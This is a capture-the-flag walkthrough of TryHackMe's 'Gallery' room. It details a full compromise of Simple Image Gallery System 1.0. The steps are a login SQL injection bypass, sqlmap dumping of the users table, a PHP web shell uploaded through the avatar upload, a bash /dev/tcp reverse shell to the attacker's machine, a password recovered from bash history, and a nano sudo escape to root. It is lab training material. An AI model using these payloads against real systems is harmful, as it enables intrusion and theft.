# Gallery

Try to exploit our image gallery system

Our gallery is not very well secured.

Designed and created by Mikaa

Room: https://tryhackme.com/room/gallery666

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/gallery666.md

Here’s the full room walkthrough with the extra Nmap and room-question details added.

--------

## Overview

This room involved exploiting a vulnerable **Simple Image Gallery System** web application. The attack path started with web enumeration, then moved into a login SQL injection, an authenticated SQL injection against the album image page, avatar upload abuse for remote code execution, and finally Linux privilege escalation through a backup of Mike’s home directory and a sudo script that opened `nano` as root.

The main chain was:

1. Scan ports with Nmap.
2. Find the Gallery web application.
3. Identify the CMS as Simple Image Gallery System v1.0.
4. Bypass the login page with SQL injection.
5. Use the authenticated Exploit DB 50198 SQL injection on the album image page.
6. Dump the admin user hash.
7. Upload a PHP shell through the avatar upload.
8. Get a reverse shell as `www-data`.
9. Find Mike’s backup in `/var/backups`.
10. Recover Mike’s password from `.bash_history`.
11. Switch to Mike.
12. Abuse sudo access to `/opt/rootkit.sh`.
13. Escape from `nano` and get root.

Flags, passwords, and sensitive values are masked in this writeup.

## Nmap

I started with a full TCP port scan.

```bash
sudo nmap -p- --min-rate 5000 -oN nmap-all.txt 10.66.175.26
```

The scan found three open ports.

```text
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

This answered the first room question.

```text
How many ports are open?
3
```

## Web Enumeration

Since ports `80` and `8080` were open, I focused on the web services. The main application was found under `/gallery`.

I ran Gobuster against the Gallery directory.

```bash
gobuster dir -u http://10.66.175.26/gallery/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak
```

Interesting results included:

```text
/albums
/archives
/assets
/build
/classes
/config.php
/create_account.php
/database
/dist
/home.php
/inc
/index.php
/login.php
/plugins
/report
/uploads
/user
```

The registration page existed but was disabled.

```text
/gallery/create_account.php
```

Checking it returned:

```text
Disabled
```

## Identifying the CMS

I saved the homepage and searched for a version string.

```bash
curl -s http://10.66.175.26/gallery/ -o index.html
grep -i "v1" index.html
```

The footer disclosed the application and version.

```text
Gallery by oretnom23 v1.0
```

This identified the CMS as:

```text
Simple Image Gallery System
```

This answered the second room question.

```text
What's the name of the CMS?
Simple Image Gallery System
```

## Public Exploit Research

I searched for known exploits.

```bash
searchsploit Simple Image Gallery System
```

SearchSploit returned:

```text
Simple Image Gallery System 1.0 - 'id' SQL Injection | php/webapps/50198.txt
```

I copied and reviewed the exploit notes.

```bash
searchsploit -m php/webapps/50198.txt
cat 50198.txt
```

The exploit described an authenticated SQL injection in the `id` GET parameter after clicking an image inside an album.

The proof of concept flow was:

```text
Login to the application with any verified user credentials.
Click Albums.
Select or create an album.
Click an image and capture the request in Burp.
Run sqlmap against the captured request.
```

The vulnerable parameter was:

```text
id
```

At this point, I still needed authenticated access to the application.

## Login SQL Injection

The login form used `username` and `password`.

```bash
curl -s http://10.66.175.26/gallery/login.php | grep -Ei "name=|action|f="
```

Relevant output:

```html
<form id="login-frm" action="" method="post">
<input type="text" class="form-control" name="username" placeholder="Username">
<input type="password" class="form-control" name="password" placeholder="Password">
```

Testing the login endpoint leaked the SQL query being used by the backend.

```bash
curl -i -c cookies.txt -b cookies.txt -X POST "http://10.66.175.26/gallery/classes/Login.php?f=login" \
  -d "username=admin" \
  -d "password=admin123"
```

The response included the backend query.

```json
{"status":"incorrect","last_qry":"SELECT * from users where username = 'admin' and password = md5('admin123') "}
```

This confirmed two useful things:

1. The login endpoint was `/gallery/classes/Login.php?f=login`.
2. The username value was being inserted directly into a SQL query.

I bypassed the login page using a basic SQL injection payload.

```bash
curl -i -c cookies.txt -b cookies.txt -X POST "http://10.66.175.26/gallery/classes/Login.php?f=login" \
  --data-urlencode "username=' OR 1=1 -- -" \
  -d "password=x"
```

This created a valid authenticated session.

With that session, I could access the album image pages and continue with the authenticated SQL injection from Exploit DB.

## Finding the Vulnerable Album URL

An uploaded image path gave a useful clue.

```text
/gallery/uploads/user_1/album_2/1628489520_1.jpg
```

This suggested the album ID was `2`.

The album image page was:

```text
http://10.66.175.26/gallery/?page=albums/images&id=2
```

This matched the Exploit DB proof of concept, where the vulnerable parameter was `id`.

## SQL Injection With SQLmap

Using the authenticated PHP session cookie from the login bypass, I ran SQLmap against the album image page.

```bash
sqlmap -u "http://10.66.175.26/gallery/?page=albums/images&id=2" \
  --cookie="PHPSESSID=2vqv9tfvlhst31slk464381rnt" \
  --batch --dbs
```

SQLmap confirmed the injection and found two databases.

```text
available databases:
gallery_db
information_schema
```

I then dumped the `users` table.

```bash
sqlmap -u "http://10.66.175.26/gallery/?page=albums/images&id=2" \
  --cookie="PHPSESSID=2vqv9tfvlhst31slk464381rnt" \
  --batch -D gallery_db -T users --dump
```

The admin user was dumped.

```text
username: admin
password: a228b...531c
```

This answered the admin hash question.

```text
What's the hash password of the admin user?
a228b...531c
```

I tried cracking the hash with John.

```bash
echo 'a228b12a08b6527e7978cbe5d914531c' > admin.hash
john admin.hash --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
```

RockYou did not crack the hash, but cracking was not needed for the final path.

## Uploading a PHP Shell

The dumped admin user row showed that avatar files were stored in the uploads directory.

```text
uploads/1629883080_1624240500_avatar.png
```

The avatar upload could be abused to upload a PHP shell.

After uploading the shell, it was available at:

```text
http://10.66.175.26/gallery/uploads/1780803540_shell.php
```

I confirmed command execution.

```bash
curl "http://10.66.175.26/gallery/uploads/1780803540_shell.php?cmd=id"
```

Output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirmed RCE as `www-data`.

## Reverse Shell

I started a Netcat listener on my machine.

```bash
nc -lvnp 4444
```

Then I triggered a Bash reverse shell through the uploaded PHP shell.

```bash
curl "http://10.66.175.26/gallery/uploads/1780803540_shell.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/10.66.75.190/4444%200%3E%261'"
```

The shell connected back.

```text
Connection received on 10.66.175.26
bash: cannot set terminal process group
bash: no job control in this shell
www-data@ip-10-66-175-26:/var/www/html/gallery/uploads$
```

Checking the user confirmed the shell was running as `www-data`.

```bash
id
```

Output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Local Enumeration

I checked `/home`.

```bash
cd /home
ls
```

Output:

```text
mike
ssm-user
ubuntu
```

Mike’s home directory contained the user flag, but `www-data` could not read it.

```bash
cd /home/mike
ls
cat user.txt
```

Output:

```text
documents
images
user.txt
cat: user.txt: Permission denied
```

So the next goal was to move from `www-data` to `mike`.

## Database Credentials

I checked the Gallery application configuration.

```bash
cat /var/www/html/gallery/classes/DBConnection.php
cat /var/www/html/gallery/config.php
cat /var/www/html/gallery/initialize.php
```

The database credentials were stored in `initialize.php`.

```php
if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"passw0rd321");
if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
```

The database password was:

```text
passw...321
```

This was useful information, but it was not the final lateral movement path.

## Finding Mike’s Backup

I checked `/var/backups` and found a backup directory for Mike.

```bash
cd /var/backups
ls
```

The interesting directory was:

```text
mike_home_backup
```

Inside the backup, I found `.bash_history`.

```bash
cd /var/backups/mike_home_backup
cat .bash_history
```

The history showed that Mike had accidentally typed his password into the terminal.

```text
cd ~
ls
ping 1.1.1.1
cat /home/mike/user.txt
cd /var/www/
ls
cd html
ls -al
cat index.html
sudo -lb3stpassw0rdbr0xx
clear
sudo -l
exit
```

The leaked password was:

```text
b3st...0xx
```

## Switching to Mike

I used the leaked password to switch to Mike.

```bash
su mike
```

Then I read the user flag.

```bash
cat /home/mike/user.txt
```

User flag:

```text
THM{af05c...46ef}
```

This answered the user flag question.

```text
What's the user flag?
THM{af05c...46ef}
```

## Sudo Enumeration

As Mike, I checked sudo permissions.

```bash
sudo -l
```

Mike could run the rootkit script as root.

```bash
sudo /bin/bash /opt/rootkit.sh
```

Running it showed a prompt.

```text
Would you like to versioncheck, update, list or read the report ?
```

The useful option was:

```text
read
```

This opened a report in `nano` as root.

## Privilege Escalation Through Nano

Since `nano` was opened through a root sudo script, I used Nano’s command execution feature.

Inside Nano:

1. Press `Ctrl+r`
2. Press `Ctrl+x`
3. Enter the command:

```bash
chmod u+s /bin/bash
```

After exiting Nano, I ran Bash with preserved privileges.

```bash
/bin/bash -p
id
```

Output:

```text
uid=1001(mike) gid=1001(mike) euid=0(root) groups=1001(mike)
```

The effective UID was root.

## Root Flag

With the root effective UID, I read the root flag.

```bash
cat /root/root.txt
```

Root flag:

```text
THM{ba87e...de87}
```

This answered the final room question.

```text
What's the root flag?
THM{ba87e...de87}
```

## Summary

The final attack chain was:

1. Nmap found 3 open ports: SSH, HTTP, and HTTP proxy.
2. Web enumeration found `/gallery`.
3. The footer disclosed Gallery v1.0.
4. The login endpoint leaked its SQL query.
5. The login page was bypassed with `' OR 1=1 -- -`.
6. SearchSploit found an authenticated SQL injection for Simple Image Gallery System 1.0.
7. SQLmap exploited `/gallery/?page=albums/images&id=2`.
8. The `gallery_db.users` table exposed the admin MD5 hash.
9. Avatar upload allowed a PHP shell to be uploaded.
10. The PHP shell gave RCE as `www-data`.
11. `/var/backups/mike_home_backup/.bash_history` exposed Mike’s password.
12. `su mike` gave access to the user flag.
13. Mike could run `/opt/rootkit.sh` with sudo.
14. The script opened `nano` as root.
15. Nano command execution was used to set the SUID bit on `/bin/bash`.
16. `/bin/bash -p` gave a root effective UID.
17. The root flag was captured.
